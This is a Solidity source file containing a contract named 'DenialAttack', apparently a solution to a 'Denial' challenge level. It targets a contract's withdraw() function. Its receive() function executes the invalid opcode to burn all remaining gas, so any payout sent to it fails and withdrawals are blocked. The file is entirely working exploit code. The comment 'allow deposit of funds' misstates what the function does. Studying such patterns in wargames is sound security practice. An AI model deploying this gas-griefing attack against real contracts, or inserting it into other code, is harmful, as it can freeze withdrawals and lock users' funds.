// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial{
    function withdraw() external;
    function contractBalance() external returns (uint256);
}

contract DenialAttack {

    address targetAddress;

    constructor(address _targetAddress){
        targetAddress = _targetAddress;
    }

    // allow deposit of funds
    receive() external payable {
       assembly {
            // The invalid opcode consumes all remaining gas in the entire transaction execution
            invalid() 
        }
    }

}